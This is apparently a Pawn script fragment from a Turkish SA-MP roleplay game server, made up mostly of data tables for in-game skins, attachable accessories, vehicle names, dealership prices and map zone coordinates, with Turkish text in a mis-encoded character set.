new SilahVerileri[][] =
{
	//Silahid, matA, matB, matC, matD, matE, payday süre
	{22, 30, 30, 30, 0, 0, 8},
	{24, 45, 50, 50, 0, 0, 12},
	{25, 45, 50, 50, 40, 0, 10},
	{28, 40, 40, 55, 45, 0, 12},
	{29, 60, 65, 60, 60, 40, 16},
	{30, 80, 100, 90, 80, 80, 24},
	{31, 9999, 9999, 9999, 9999, 9999, 9999},//130, 115, 105, 60, 30, 24
	{32, 40, 55, 45, 40, 0, 12},
	{33, 45, 60, 50, 50, 0, 14}
};

new ErkekKiyafetVerileri[188][] =
{
	{1,25},
	{2,50},
	{3,100},
	{4,120},
	{5,150},
	{6,600},
	{7,50},
	{8,250},
	{14,70},
	{15,70},
	{16,100},
	{17,500},
	{18,25},
	{19,70},
	{20,50},
	{21,75},
	{23,50},
	{24,75},
	{25,75},
	{26,50},
	{27,50},
	{28,75},
	{29,100},
	{30,25},
	{32,80},
	{33,200},
	{34,80},
	{35,80},
	{36,80},
	{37,80},
	{42,300},
	{43,100},
	{44,70},
	{45,25},
	{46,250},
	{47,60},
	{48,60},
	{49,100},
	{50,200},
	{51,50},
	{52,50},
	{57,100},
	{58,80},
	{59,250},
	{60,30},
	{61,80},
	{62,40},
	{66,100},
	{67,100},
	{68,100},
	{72,70},
	{73,70},
	{78,10},
	{79,10},
	{82,200},
	{83,200},
	{84,200},
	{86,200},
	{94,120},
	{95,70},
	{96,70},
	{97,25},
	{98,150},
	{100,80},
	{101,70},
	{102,75},
	{103,75},
	{104,75},
	{105,75},
	{106,75},
	{107,75},
	{108,75},
	{109,75},
	{110,75},
	{111,500},
	{112,300},
	{113,10000},
	{114,75},
	{115,75},
	{116,75},
	{117,250},
	{118,250},
	{119,500},
	{120,20000},
	{121,85},
	{122,85},
	{123,10000},
	{124,250},
	{125,10000},
	{126,500},
	{127,250},
	{128,20},
	{133,20},
	{134,10},
	{135,10},
	{136,10},
	{137,10},
	{142,80},
	{143,80},
	{144,85},
	{147,600},
	{149,200},
	{153,100},
	{154,25},
	{156,50},
	{158,20},
	{159,10},
	{160,10},
	{161,25},
	{162,10},
	{163,100},
	{164,100},
	{165,200},
	{166,200},
	{168,30},
	{170,25},
	{173,75},
	{174,75},
	{176,75},
	{177,75},
	{179,100},
	{180,75},
	{181,75},
	{182,20},
	{183,25},
	{184,30},
	{185,150},
	{186,10000},
	{187,200},
	{188,100},
	{200,10},
	{202,25},
	{206,25},
	{208,150},
	{210,50},
	{217,50},
	{220,75},
	{221,75},
	{222,75},
	{223,150},
	{227,100},
	{228,150},
	{229,50},
	{230,10},
	{234,25},
	{235,25},
	{236,25},
	{239,10},
	{240,250},
	{241,50},
	{242,50},
	{247,75},
	{248,75},
	{249,200},
	{250,25},
	{254,75},
	{258,75},
	{259,75},
	{261,50},
	{262,20},
	{268,100},
	{269,100},
	{270,100},
	{271,100},
	{272,150},
	{273,100},
	{289,150},
	{290,1000},
	{291,250},
	{292,150},
	{293,150},
	{294,1000},
	{295,1000},
	{296,10000},
	{297,150},
	{299,700},
	{303,450},
	{304,450},
	{305,450},
	{25004,10000},
	{25011,500},
	{25020,1000},
	{25022,2000},
	{25025,750},
	{25027,750},
	{25031,750},
	{25039,10000},
    {25040,1000}
};

new KadinKiyafetVerileri[71][] =
{
	{9,50},
	{10,20},
	{11,75},
	{12,100},
	{13,100},
	{31,25},
	{38,25},
	{39,25},
	{40,1000},
	{41,75},
	{53,50},
	{54,30},
	{55,100},
	{56,100},
	{63,75},
	{64,75},
	{65,120},
	{69,50},
	{75,100},
	{76,600},
	{77,10},
	{85,10000},
	{87,50},
	{88,25},
	{89,25},
	{90,75},
	{91,1000},
	{93,100},
	{129,20},
	{131,20},
	{138,100},
	{139,100},
	{140,100},
	{141,350},
	{145,120},
	{148,200},
	{150,750},
	{151,25},
	{152,75},
	{169,1000},
	{172,75},
	{178,100},
	{190,75},
	{191,75},
	{192,75},
	{193,120},
	{194,75},
	{195,75},
	{196,25},
	{198,25},
	{199,15},
	{201,15},
	{207,75},
	{211,120},
	{214,1000},
	{216,750},
	{219,500},
	{226,75},
	{233,100},
	{237,75},
	{238,75},
	{243,50},
	{244,50},
	{245,50},
	{246,50},
	{251,120},
	{256,100},
	{257,75},
	{263,500},
	{298,100},
	{25021,750}
};
new TaserDurum[MAX_PLAYERS];
new Kelepceli[MAX_PLAYERS];
new selamlas[MAX_PLAYERS] = 0;
new selamturu[MAX_PLAYERS] = 0;
new akmm[MAX_PLAYERS];
new aliste = mS_INVALID_LISTID;
new uliste = mS_INVALID_LISTID;
new bliste = mS_INVALID_LISTID;
new aksesuarliste = mS_INVALID_LISTID;
new pdaksesuarliste = mS_INVALID_LISTID;
new mcaksesuarliste = mS_INVALID_LISTID;
new SectigiArac[MAX_PLAYERS];
new SectigiAracRenk1[MAX_PLAYERS];
new SectigiAracRenk2[MAX_PLAYERS];
new SectigiYakit[MAX_PLAYERS];
new SectigiHizSabit[MAX_PLAYERS];
new SectigiImmo[MAX_PLAYERS];
new SectigiKilit[MAX_PLAYERS];
new SectigiAlarm[MAX_PLAYERS];
new AldigiAracFiyati[MAX_PLAYERS];
new Text3D:Plaka3DText[MAX_VEHICLES];
new girishakki[MAX_PLAYERS];
//new Timer;//the define for the timer
new BigEar[MAX_PLAYERS] = 0;
new UnfreezeTimerVar[MAX_PLAYERS] = -1;
new bool:AnimasyonYapiyor[MAX_PLAYERS];
//new KaydimVardi[MAX_PLAYERS] = 0;
new PMAcik[MAX_PLAYERS] = 0;
new adpmd[MAX_PLAYERS] = 0;
new lastpm[MAX_PLAYERS] = -1;
new Doldurpasam[MAX_PLAYERS] = 0;
new aracsatiyo[MAX_PLAYERS] = 0;
new aracfiyat[MAX_PLAYERS] = 0;
new aracide[MAX_PLAYERS] = 0;
new aracwhois[MAX_PLAYERS] = -1;

new MotoruAciliyor[MAX_VEHICLES];
new aDuty[MAX_PLAYERS];
new aDuty2[MAX_PLAYERS];
new tDuty[MAX_PLAYERS];
new PlayerText:AracListeTD[MAX_PLAYERS];
new PlayerText:AracListeTDYazi[MAX_PLAYERS];
new AracListeAracD[MAX_PLAYERS];
new PlayerText:AracListeTDSol[MAX_PLAYERS];
new PlayerText:AracListeTDSag[MAX_PLAYERS];

new SatinalArac[MAX_PLAYERS];


AnimasyonKullan(playerid,animlib[],animname[], Float:xSpeed, looping, lockx, locky, lockz, lp)
{
    AnimasyonYapiyor[playerid] = true;
    #pragma unused lp
    ApplyAnimation(playerid, animlib, animname, xSpeed, looping, lockx, locky, lockz, 0, 1);
}
#define ApplyAnimationEx AnimasyonKullan
PreloadAnimLib(playerid, animlib[])
{
    ApplyAnimation(playerid,animlib,"null",0.0,0,0,0,0,0);
}
enum AttachmentEnum
{
    attachmodel,
    attachname[24],
    attachfiyat
}

new polAttach[][AttachmentEnum] =
{
{18642, "Taser",0},
{18636, "Polis Þapkasý 1",0},
{19099, "Polis Þapkasý 2",0},
{19100, "Polis Þapkasý 3",0},
{18637, "Polis Kalkaný 1",0},
{19138, "Polis Gözlüðü 1",0},
{19139, "Polis Gözlüðü 2",0},
{19140, "Polis Gözlüðü 3",0},
{19141, "SWAT Kaský",0},
{19142, "SWAT Yeleði",0},
{19347, "Polis Rozeti",0}
};

new AttachmentBones[][24] = {
{"Omurga"},
{"Kafa"},
{"Sol kol üstü"},
{"Sað kol üstü"},
{"Sol el"},
{"Sag el"},
{"Sol kalça"},
{"Sað kalça"},
{"Sol ayak"},
{"Sað ayak"},
{"Sað baldýr"},
{"Sol baldýr"},
{"Sol kol"},
{"Sag kol"},
{"Sol kürek"},
{"Sag kürek"},
{"Boyun"},
{"Çene"}
};

enum aqsar
{
	abone,
	amodel,
	Float:akX,
	Float:akY,
	Float:akZ,
	Float:arX,
	Float:arY,
	Float:arZ,
	Float:aoX,
	Float:aoY,
	Float:aoZ,
	arenk1,
	arenk2,
	bool:giyilmis,
};
new aksesuar[MAX_PLAYERS][5][aqsar];

new AttachmentObjects[][AttachmentEnum] = {
{19553, "Hasýr Þapka",10},
{19555, "Box Eldiveni (Sol)",10},
{19556, "Box Eldiveni (Sað)",10},
{19558, "Pizzacý Þapkasý",10},
{19559, "Kamp Çantasý",10},
{19570, "Süt Þiþesi",10},
{19528, "Cadý Þapkasý",10},
{19904, "Ýnþaat Üniformasý",10},
{19878, "Kaykay",10},
{19631, "Balyoz",10},
{19610, "Mikrofon",10},
{18891, "Bandana1",10},
{18892, "Bandana2",10},
{18893, "Bandana3",10},
{18894, "Bandana4",10},
{18895, "Bandana5",10},
{18896, "Bandana6",10},
{18897, "Bandana7",10},
{18898, "Bandana8",10},
{188999, "Bandana9",10},
{18900, "Bandana10",10},
{18901, "Bandana11",10},
{18902, "Bandana12",10},
{18903, "Bandana13",10},
{18904, "Bandana14",10},
{18905, "Bandana15",10},
{19554, "Bere",10},
{18921, "Bere2",10},
{18922, "Bere3",10},
{18923, "Bere4",10},
{18924, "Bere5",10},
{19067, "Bere6",10},
{19068, "Bere7",10},
{19069, "Bere8",10},
{18964, "Bere9",10},
{18965, "Bere10",10},
{18966, "Bere11",10},
{18939, "Þapka1",10},
{18940, "Þapka2",10},
{18941, "Þapka3",10},
{18942, "Þapka4",10},
{18943, "Þapka5",10},
{19095, "Cowboy Þapkasý1",10},
{18962, "Cowboy Þapkasý2",10},
{19096, "Cowboy Þapkasý3",10},
{19097, "Cowboy Þapkasý4",10},
{19098, "Cowboy Þapkasý5",10},
{19006, "Gözlük1",10},
{19007, "Gözlük2",10},
{19008, "Gözlük3",10},
{19009, "Gözlük4",10},
{19010, "Gözlük5",10},
{19011, "Gözlük6",10},
{19012, "Gözlük7",10},
{19013, "Gözlük8",10},
{19014, "Gözlük9",10},
{19015, "Gözlük10",10},
{19016, "Gözlük11",10},
{19017, "Gözlük12",10},
{19018, "Gözlük13",10},
{19019, "Gözlük14",10},
{19020, "Gözlük15",10},
{19021, "Gözlük16",10},
{19022, "Gözlük17",10},
{19023, "Gözlük18",10},
{19024, "Gözlük19",10},
{19025, "Gözlük20",10},
{19026, "Gözlük21",10},
{19026, "Gözlük22",10},
{19028, "Gözlük23",10},
{19029, "Gözlük24",10},
{19030, "Gözlük25",10},
{19031, "Gözlük26",10},
{19032, "Gözlük27",10},
{19033, "Gözlük28",10},
{19034, "Gözlük29",10},
{19035, "Gözlük30",10},
{19094, "BurgerShot Þapkasý",10},
{19137, "CluckinBell Hat",10},
{18944, "Fötr Þapka1",10},
{18945, "Fötr Þapka2",10},
{18946, "Fötr Þapka3",10},
{18947, "Fötr Þapka4",10},
{18948, "Fötr Þapka5",10},
{18949, "Fötr Þapka6",10},
{18950, "Fötr Þapka7",10},
{18951, "Fötr Þapka8",10},
{18936, "Kask1",10},
{18937, "Kask2",10},
{18938, "Kask3",10},
{18976, "Kask4",10},
{18977, "Kask5",10},
{18978, "Kask6",10},
{18979, "Kask7",10},
{18645, "Kask8",10},
{18638, "Kasket",10},
{18911, "Maske1",10},
{18912, "Maske2",10},
{18913, "Maske3",10},
{18914, "Maske4",10},
{18915, "Maske5",10},
{18916, "Maske6",10},
{18917, "Maske7",10},
{18918, "Maske8",10},
{18919, "Maske9",10},
{18920, "Maske10",10},
{19036, "Hokey Maskesi1",10},
{19037, "Hokey Maskesi2",10},
{19038, "Hokey Maskesi3",10},
{18974, "Zorro Maskesi",10},
{19039, "Saat1",10},
{19040, "Saat2",10},
{19041, "Saat3",10},
{19042, "Saat4",10},
{19043, "Saat5",10},
{19044, "Saat6",10},
{19045, "Saat7",10},
{19046, "Saat8",10},
{19047, "Saat9",10},
{19048, "Saat10",10},
{19049, "Saat11",10},
{19050, "Saat12",10},
{19051, "Saat13",10},
{19052, "Saat14",10},
{19053, "Saat15",10},
{19330, "Ýtfaiyeci Þapkasý1",10},
{19331, "Ýtfaiyeci Þapkasý2",10},
{19317, "Gitar1",10},
{19318, "Gitar2",10},
{19319, "Gitar3",10},
{19348, "Baston",10},
{19350, "Býyýk1",10},
{19351, "Býyýk2",10},
{19349, "Tek gözlük",10},
{19352, "Þapka",10},
{19421, "Kulaklýk 1",10},
{19422, "Kulaklýk 2",10},
{19423, "Kulaklýk 3",10},
{19424, "Kulaklýk 4",10},
{19469, "Bandana",10},
{19472, "Gaz Maskesi",10},
{19516, "Saç1",10},
{19516, "Saç2",10},
{19518, "Saç3",10},
{19518, "Saç4",10},
{19621, "Yaðdanlýk",10},
{19622, "Fýrça",10},
{19624, "Çanta",10},
{19625, "Sigara",10},
{19626, "Kürek",10},
{19627, "Anahtar",10},
{19581, "Tava",10},
{19583, "Býçak",10},
{19584, "Tencere",10},
{19586, "Spatula",10},
{18635, "Çekiç",10},
{18634, "Levye",10},
{335, "Býçak",10},
{18633, "Boru",10},
{18644, "Tornavida",10},
{18638, "Ýþçi Þapkasý",50},
{18639, "Siyah Þapka",50},
{18640, "Saç 1",50},
{18975, "Saç 2",50},
{19274, "Saç 3",50},
{19077, "Saç 4",50},
{19136, "Saç - Gözlük - Þapka",50},
{18641, "El feneri",20},
{18875, "Çaðrý Cihazý",50},
{18890, "Týrmýk",20},
{18891, "Bandana 1",30},
{18892, "Bandana 2",30},
{18893, "Bandana 3",30},
{18894, "Bandana 4",30},
{18895, "Bandana 5",30},
{18896, "Bandana 6",30},
{18897, "Bandana 7",30},
{18898, "Bandana 8",30},
{18899, "Bandana 9",30},
{18900, "Bandana 10",30},
{18901, "Bandana 11",30},
{18902, "Bandana 12",30},
{18903, "Bandana 13",30},
{18904, "Bandana 14",30},
{18905, "Bandana 15",30},
{18906, "Bandana 16",30},
{18907, "Bandana 17",30},
{18908, "Bandana 18",30},
{18909, "Bandana 19",30},
{18910, "Bandana 20",30},
{18921, "Bere 1",30},
{18922, "Bere 2",30},
{18923, "Bere 3",30},
{18924, "Bere 4",30},
{18925, "Bere 5",30},
{18926, "Þapka 1",30},
{18927, "Þapka 2",30},
{18928, "Þapka 3",30},
{18929, "Þapka 4",30},
{18930, "Þapka 5",30},
{18931, "Þapka 6",30},
{18932, "Þapka 7",30},
{18933, "Þapka 8",30},
{18934, "Þapka 9",30},
{18935, "Þapka 10",30},
{18936, "Miðfer 1",50},
{18937, "Miðfer 2",50},
{18938, "Miðfer 3",50},
{19101, "Miðfer 4",50},
{19102, "Miðfer 5",50},
{19103, "Miðfer 6",50},
{19104, "Miðfer 7",50},
{19105, "Miðfer 8",50},
{18939, "Þapka(geriye) 1",30},
{18940, "Þapka(geriye) 2",30},
{18941, "Þapka(geriye) 3",30},
{18942, "Þapka(geriye) 4",30},
{18943, "Þapka(geriye) 5",30},
{18944, "Hasýr Þapka 1",40},
{18945, "Hasýr Þapka 2",40},
{18946, "Hasýr Þapka 3",40},
{18947, "Fötr Þapka 1",40},
{18948, "Fötr Þapka 2",40},
{18949, "Fötr Þapka 3",40},
{18950, "Fötr Þapka 4",40},
{18951, "Fötr Þapka 5",40},
{19488, "Fötr Þapka 6",40},
{18952, "Boks Kaský",40},
{18953, "Örgü Þapka 1",40},
{18954, "Örgü Þapka 2",40},
{18955, "Eðik Þapka 1",30},
{18956, "Eðik Þapka 2",30},
{18957, "Eðik Þapka 3",30},
{18958, "Eðik Þapka 4",30},
{18959, "Eðik Þapka 5",30},
{18960, "Kývrýlmýþ Þapka",30},
{18961, "Kamyoncu Þapkasý",30},
{19095, "Kovboy Þapkasý 1",30},
{18962, "Kovboy Þapkasý 2",30},
{19096, "Kovboy Þapkasý 3",30},
{19097, "Kovboy Þapkasý 4",30},
{19098, "Kovboy Þapkasý 5",30},
{18968, "Hasýr Þapka 4",40},
{18969, "Hasýr Þapka 5",40},
{19163, "Kar Maskesi",60},
{18964, "Kukuleta 1",30},
{18965, "Kukuleta 1",30},
{18966, "Kukuleta 3",30},
{18970, "Modern Kovboy Þapkasý 1",60},
{18971, "Modern Kovboy Þapkasý 2",60},
{18972, "Modern Kovboy Þapkasý 3",60},
{18973, "Modern Kovboy Þapkasý 4",60},
{18974, "Zorro Maskesi",60},
{18645, "Motorsiklet Kaský 1",50},
{18976, "Motorsiklet Kaský 2",50},
{18977, "Motorsiklet Kaský 3",50},
{18978, "Motorsiklet Kaský 4",50},
{18979, "Motorsiklet Kaský 5",50},
{19006, "Gözlük 1",20},
{19007, "Gözlük 2",20},
{19008, "Gözlük 3",20},
{19009, "Gözlük 4",20},
{19010, "Gözlük 5",20},
{19011, "Gözlük 6",20},
{19012, "Gözlük 7",20},
{19013, "Gözlük 8",20},
{19014, "Gözlük 9",20},
{19015, "Gözlük 10",20},
{19016, "Gözlük 11",20},
{19017, "Gözlük 12",20},
{19018, "Gözlük 13",20},
{19019, "Gözlük 14",20},
{19020, "Gözlük 15",20},
{19021, "Gözlük 16",20},
{19022, "Gözlük 17",20},
{19023, "Gözlük 18",20},
{19024, "Gözlük 19",20},
{19025, "Gözlük 20",20},
{19026, "Gözlük 21",20},
{19027, "Gözlük 22",20},
{19028, "Gözlük 23",20},
{19029, "Gözlük 24",20},
{19030, "Gözlük 25",20},
{19031, "Gözlük 26",20},
{19032, "Gözlük 27",20},
{19033, "Gözlük 28",20},
{19034, "Gözlük 29",20},
{19035, "Gözlük 30",20},
{19138, "Gözlük 31",20},
{19036, "Hokey Maskesi 1",30},
{19037, "Hokey Maskesi 2",30},
{19038, "Hokey Maskesi 3",30},
{19085, "Göz Bandý",30},
{19090, "Ponpon (Mavi)",50},
{19091, "Ponpon (Kýrmýzý)",50},
{19092, "Ponpon (Yeþil)",50},
{19093, "DUDE Þapka 1",30},
{19160, "DUDE Þapka 2",30},
{19064, "Noel Baba Þapkasý 1",20},
{19065, "Noel Baba Þapkasý 2",20},
{19066, "Noel Baba Þapkasý 3",20},
{19067, "Hoody Þapka 1",20},
{19068, "Hoody Þapka 2",20},
{19069, "Hoody Þapka 3",20},
{19094, "Burger Shot Þapkasý",50},
{19113, "Komik Kasket 1",50},
{19114, "Komik Kasket 2",50},
{19115, "Komik Kasket 3",50},
{19116, "Kasket 1",20},
{19117, "Kasket 2",20},
{19118, "Kasket 3",20},
{19119, "Kasket 4",20},
{19120, "Kasket 5",20},
{19137, "Cluckin Bell Þapkasý 1",50},
{19317, "Bas Gitar",400},
{19318, "Elektro Gitar 1",500},
{19319, "Elektro Gitar 2",600},
{19330, "Ýtfaiyeci Þapkasý 1",50},
{19331, "Ýtfaiyeci Þapkasý 2",50},
{19348, "Baston",40},
{19349, "Tek Gözlük (monokl)",50},
{19350, "Býyýk 1",30},
{19351, "Býyýk 2",30},
{19352, "Sihirbaz Þapkasý 1",60},
{19487, "Sihirbaz Þapkasý 2",60},
{1485, "Puro", 10},
{19801, "Kar Maskesi", 20},
{11745, "Çanta 2", 10},
{11738, "Çanta 3", 10},
{371, "Çanta 4", 30},
{1210, "El Çantasý", 30},
{11624, "Bavul", 20},
{11623, "Fotoðraf Makinesi", 50},
{19896, "Sigara Paketi", 5},
{19897, "Sigara Paketi2", 5}
};

new VehicleName[213][0] = {
   "Landstalker",
   "Bravura",
   "Buffalo",
   "Linerunner",
   "Pereniel",
   "Sentinel",
   "Dumper",
   "Ýtfaiye Aracý",
   "Trashmaster",
   "Stretch",
   "Manana",
   "Infernus",
   "Voodoo",
   "Pony",
   "Mule",
   "Cheetah",
   "Ambulans",
   "Leviathan",
   "Moonbeam",
   "Esperanto",
   "Taxi",
   "Washington",
   "Bobcat",
   "Mr Whoopee",
   "BF Injection",
   "Hunter",
   "Premier",
   "Enforcer",
   "Securicar",
   "Banshee",
   "Predator",
   "Bus",
   "Rhino",
   "Barracks",
   "Hotknife",
   "Trailer", //artict1
   "Previon",
   "Coach",
   "Cabbie",
   "Stallion",
   "Rumpo",
   "RC Bandit",
   "Romero",
   "Packer",
   "Monster",
   "Admiral",
   "Squalo",
   "Seasparrow",
   "Pizzaboy",
   "Tram",
   "Trailer", //artict2
   "Turismo",
   "Speeder",
   "Reefer",
   "Tropic",
   "Flatbed",
   "Yankee",
   "Caddy",
   "Solair",
   "Berkley's RC Van",
   "Skimmer",
   "PCJ-600",
   "Faggio",
   "Freeway",
   "RC Baron",
   "RC Raider",
   "Glendale",
   "Oceanic",
   "Sanchez",
   "Sparrow",
   "Patriot",
   "Quad",
   "Coastguard",
   "Dinghy",
   "Hermes",
   "Sabre",
   "Rustler",
   "ZR-350",
   "Walton",
   "Regina",
   "Comet",
   "BMX",
   "Burrito",
   "Camper",
   "Marquis",
   "Baggage",
   "Dozer",
   "Maverick",
   "News Chopper",
   "Rancher",
   "FBI Rancher",
   "Virgo",
   "Greenwood",
   "Jetmax",
   "Hotring",
   "Sandking",
   "Blista Compact",
   "Polis Helikopteri",
   "Boxville",
   "Benson",
   "Mesa",
   "RC Goblin",
   "Hotring Racer", //hotrina
   "Hotring Racer", //hotrinb
   "Bloodring Banger",
   "Rancher",
   "Super GT",
   "Elegant",
   "Journey",
   "Bike",
   "Mountain Bike",
   "Beagle",
   "Cropdust",
   "Stunt",
   "Tanker", //petro
   "RoadTrain",
   "Nebula",
   "Majestic",
   "Buccaneer",
   "Shamal",
   "Hydra",
   "FCR-900",
   "NRG-500",
   "HPV1000",
   "Cement Truck",
   "Tow Truck",
   "Fortune",
   "Cadrona",
   "FBI Truck",
   "Willard",
   "Forklift",
   "Traktor",
   "Bicerdover",
   "Feltzer",
   "Remington",
   "Slamvan",
   "Blade",
   "Freight",
   "Streak",
   "Vortex",
   "Vincent",
   "Bullet",
   "Clover",
   "Sadler",
   "Ýtfaiye Aracý", //firela
   "Hustler",
   "Intruder",
   "Primo",
   "Cargobob",
   "Tampa",
   "Sunrise",
   "Merit",
   "Utility",
   "Nevada",
   "Yosemite",
   "Windsor",
   "Monster Truck", //monstera
   "Monster Truck", //monsterb
   "Uranus",
   "Jester",
   "Sultan",
   "Stratum",
   "Elegy",
   "Raindance",
   "RC Tiger",
   "Flash",
   "Tahoma",
   "Savanna",
   "Bandito",
   "Freight", //freiflat
   "Trailer", //streakc
   "Kart",
   "Mower",
   "Duneride",
   "Sweeper",
   "Broadway",
   "Tornado",
   "AT-400",
   "DFT-30",
   "Huntley",
   "Stafford",
   "BF-400",
   "Newsvan",
   "Tug",
   "Trailer", //petrotr
   "Emperor",
   "Wayfarer",
   "Euros",
   "Hotdog",
   "Club",
   "Trailer", //freibox
   "Trailer", //artict3
   "Andromada",
   "Dodo",
   "RC Cam",
   "Launch",
   "LSPD Crown Victoria",
   "LSPD Dodge Charger",
   "LVPD",
   "LSPD Explorer",
   "Picador",
   "SWAT Van",
   "Alpha",
   "Phoenix",
   "Glendale",
   "Sadler",
   "Luggage Trailer", //bagboxa
   "Luggage Trailer", //bagboxb
   "Stair Trailer", //tugstair
   "Boxville",
   "Farm Plow", //farmtr1
   "Utility Trailer", //utiltr1
   "Yok"
};

new GaleriListesi[][] =
{
	{401, 14000, 50, "Bravura"},
	{404, 12500, 50, "Perenniel"},
	{412, 20000, 75, "Voodoo"},
	{413, 20000, 75, "Pony"},
	{414, 22000, 75, "Mule"},
	{418, 22000, 75, "Moonbeam"},
	{425, 25000, 75, "Taxi"},
	{438, 30000, 75, "Cabbie"},
	{419, 22000, 75, "Esperanto"},
	{421, 22500, 75, "Washington"},
	{422, 13000, 50, "Bobcat"},
	{410, 13000, 50, "Manana"},
	{436, 13500, 50, "Previon"},
	{440, 19000, 75, "Rumpo"},
	{442, 20000, 75, "Romero"},
	{445, 23000, 75, "Admiral"},
	{448, 4000,  25, "Pizzaboy"},
	{456, 22000, 75, "Yankee"},
	{458, 18000, 75, "Solair"},
	{462, 4000,  25, "Faggio"},
	{463, 15000, 50, "Freeway"},
	{466, 11000, 50, "Glendale"},
	{467, 12000, 50, "Oceanic"},
	{468, 13500, 50, "Sanchez"},
	//{473, 7000,  25, "Dinghy"},
	{481, 1000,  25, "BMX"},
	{479, 19500, 75, "Regina"},
	{478, 6000,  25, "Walton"},
	{482, 20000, 75, "Burrito"},
	{491, 19500, 75, "Virgo"},
	{496, 22000, 75, "BlistaCompact"},
	{498, 20500, 75, "Boxville"},
	{499, 12000, 50, "Benson"},
	{509, 750,   25, "Bike"},
	{527, 22500, 75, "Cadrona"},
	{529, 22500, 75, "Willard"},
	{531, 6750,  25, "Tractor"},
	{510, 1250,  25, "MountainBike"},
	{516, 14000, 50, "Nebula"},
	{517, 18500, 75, "Majestic"},
	{540, 22000, 75, "Vincent"},
	{542, 14000, 50, "Clover"},
	{543, 10000, 50, "Sadler"},
	{551, 22000, 75, "Merit"},
	{554, 22000, 75, "Yosemite"},
	{492, 20000, 75, "Greenwood"},
	{546, 19000, 75, "Intruder"},
	{547, 20000, 75, "Primo"},
	{549, 12000, 50, "Tampa"},
	{576, 20500, 75, "Tornado"},
	{566, 22500, 75, "Tahoma"},
	{561, 22500, 75, "Stratum"},
	{567, 20000, 75, "Savanna"},
	{585, 22000, 75, "Emperor"},
	{586, 15000, 50, "Wayfarer"},
	{600, 20000, 75, "Picador"},
	{588, 22500, 75, "Hotdog"},
	{400, 40000, 100, "Landstalker"},
	{405, 30000, 100, "Sentinel"},
	{426, 25500, 100, "Premier"},
	{439, 27000, 100, "Stallion"},
	{461, 35000, 100, "PCJ-600"},
	{474, 25000, 75, "Hermes"},
	{475, 35000, 100, "Sabre"},
	{483, 24000, 75, "Camper"},
	{489, 48000, 125, "Rancher"},
	{480, 42000, 125, "Comet"},
	{500, 28500, 100, "Mesa"},
	{507, 29500, 100, "Elegant"},
	{508, 40000, 100, "Journey"},
	{518, 31000, 100, "Buccaneer"},
	{521, 50000, 125, "FCR-900"},
	{526, 24000, 75, "Fortune"},
	{533, 25000, 75, "Feltzer"},
	{534, 31000, 100, "Remington"},
	{535, 38000, 100, "Slamvan"},
	{536, 25500, 100, "Blade"},
	{562, 45000, 125, "Elegy"},
	{565, 35000, 100, "Flash"},
	{550, 24000, 75, "Sunrise"},
	{555, 29000, 100, "Windsor"},
	{558, 32000, 100, "Uranus"},
	{575, 50000, 125, "Broadway"},
	{589, 32000, 100, "Club"},
	{580, 35000, 100, "Stafford"},
	{581, 38000, 100, "BF-400"},
	{402, 80000,  150, "Buffalo"},
	{409, 500000, 450, "Stretch"},
	{411, 350000, 450, "Infernus"},
	{415, 350000, 450, "Cheetah"},
	{429, 350000, 450, "Banshee"},
	//{446, 70000,  150, "Squallo"},
	{451, 350000, 450, "Turismo"},
	//{452, 70000,  150, "Speeder"},
	//{453, 72000,  150, "Reefer"},
	//{454, 75000,  150, "Tropic"},
	{477, 300000, 450, "ZR-350"},
	//{484, 80500,  150, "Marquis"},
	//{493, 100000, 150, "Jetmax"},
	{506, 290000, 150, "Super GT"},
	{522, 70000,  150, "NRG-500"},
	{541, 350000, 450, "Bullet"},
	{545, 70000,  150, "Hustler"},
	{559, 55500,  125, "Jester"},
	{560, 58000,  125, "Sultan"},
	{579, 85000,  150, "Huntley"},
	{587, 55000,  150, "Euros"},
	{602, 55000,  150, "Alpha"},
	{603, 58000,  150, "Phoenix"}
};
static const gSAZones[][HARITA_MAIN] = {
	//	NAME                            AREA (Xmin,Ymin,Zmin,Xmax,Ymax,Zmax)
	{"The Big Ear",	                {-410.00,1403.30,-3.00,-137.90,1681.20,200.00}},
	{"Aldea Malvada",               {-1372.10,2498.50,0.00,-1277.50,2615.30,200.00}},
	{"Angel Pine",                  {-2324.90,-2584.20,-6.10,-1964.20,-2212.10,200.00}},
	{"Arco del Oeste",              {-901.10,2221.80,0.00,-592.00,2571.90,200.00}},
	{"Avispa Country Club",         {-2646.40,-355.40,0.00,-2270.00,-222.50,200.00}},
	{"Avispa Country Club",         {-2831.80,-430.20,-6.10,-2646.40,-222.50,200.00}},
	{"Avispa Country Club",         {-2361.50,-417.10,0.00,-2270.00,-355.40,200.00}},
	{"Avispa Country Club",         {-2667.80,-302.10,-28.80,-2646.40,-262.30,71.10}},
	{"Avispa Country Club",         {-2470.00,-355.40,0.00,-2270.00,-318.40,46.10}},
	{"Avispa Country Club",         {-2550.00,-355.40,0.00,-2470.00,-318.40,39.70}},
	{"Back o Beyond",               {-1166.90,-2641.10,0.00,-321.70,-1856.00,200.00}},
	{"Battery Point",               {-2741.00,1268.40,-4.50,-2533.00,1490.40,200.00}},
	{"Bayside",                     {-2741.00,2175.10,0.00,-2353.10,2722.70,200.00}},
	{"Bayside Marina",              {-2353.10,2275.70,0.00,-2153.10,2475.70,200.00}},
	{"Beacon Hill",                 {-399.60,-1075.50,-1.40,-319.00,-977.50,198.50}},
	{"Blackfield",                  {964.30,1203.20,-89.00,1197.30,1403.20,110.90}},
	{"Blackfield",                  {964.30,1403.20,-89.00,1197.30,1726.20,110.90}},
	{"Blackfield Chapel",           {1375.60,596.30,-89.00,1558.00,823.20,110.90}},
	{"Blackfield Chapel",           {1325.60,596.30,-89.00,1375.60,795.00,110.90}},
	{"Blackfield Intersection",     {1197.30,1044.60,-89.00,1277.00,1163.30,110.90}},
	{"Blackfield Intersection",     {1166.50,795.00,-89.00,1375.60,1044.60,110.90}},
	{"Blackfield Intersection",     {1277.00,1044.60,-89.00,1315.30,1087.60,110.90}},
	{"Blackfield Intersection",     {1375.60,823.20,-89.00,1457.30,919.40,110.90}},
	{"Blueberry",                   {104.50,-220.10,2.30,349.60,152.20,200.00}},
	{"Blueberry",                   {19.60,-404.10,3.80,349.60,-220.10,200.00}},
	{"Blueberry Acres",             {-319.60,-220.10,0.00,104.50,293.30,200.00}},
	{"Pershing Apartments",         {2087.30,1543.20,-89.00,2437.30,1703.20,110.90}},
	{"Pershing Apartments",         {2137.40,1703.20,-89.00,2437.30,1783.20,110.90}},
	{"Calton Heights",              {-2274.10,744.10,-6.10,-1982.30,1358.90,200.00}},
	{"Chinatown",                   {-2274.10,578.30,-7.60,-2078.60,744.10,200.00}},
